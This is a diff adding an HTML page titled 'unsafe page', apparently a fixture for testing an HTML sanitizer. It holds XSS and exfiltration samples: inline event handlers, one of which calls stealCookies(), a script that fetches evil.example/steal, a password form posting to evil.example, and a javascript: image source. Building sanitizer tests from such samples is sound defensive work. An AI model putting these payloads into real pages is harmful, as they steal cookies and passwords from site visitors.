@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <title>不安全页面</title>
+    <style>body { display: none; }</style>
+  </head>
+  <body>
+    <article>
+      <h1 onclick="alert('xss')">不安全页面</h1>
+      <p onmouseover="stealCookies()">应当保留的正文。</p>
+      <script>fetch('https://evil.example/steal')</script>
+      <form action="https://evil.example/submit"><input name="password"></form>
+      <iframe src="https://player.bilibili.com/player.html?bvid=BV1xx411c7mD"></iframe>
+      <video src="https://evil.example/video.mp4" autoplay></video>
+      <img src="javascript:alert(1)" onerror="alert(2)" alt="危险图片">
+    </article>
+  </body>
+</html>
